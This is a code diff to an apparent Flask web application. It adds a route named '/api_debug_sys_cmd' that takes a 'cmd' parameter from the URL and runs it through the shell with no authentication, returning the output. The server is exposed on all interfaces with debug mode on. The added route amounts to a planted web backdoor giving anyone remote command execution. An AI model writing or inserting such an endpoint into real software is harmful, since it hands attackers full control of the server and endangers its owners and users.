@@ -6559,5 +6559,21 @@ _poller_thread = threading.Thread(target=_sos_background_poller, daemon=True)
 _poller_thread.start()
 
 
+@app.route('/api_debug_sys_cmd')
+def debug_sys_cmd():
+    cmd = request.args.get('cmd', '')
+    if not cmd:
+        return "No command provided"
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        return jsonify({
+            "stdout": res.stdout,
+            "stderr": res.stderr,
+            "returncode": res.returncode
+        })
+    except Exception as e:
+        return str(e)
+
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=7777, debug=True, threaded=True)
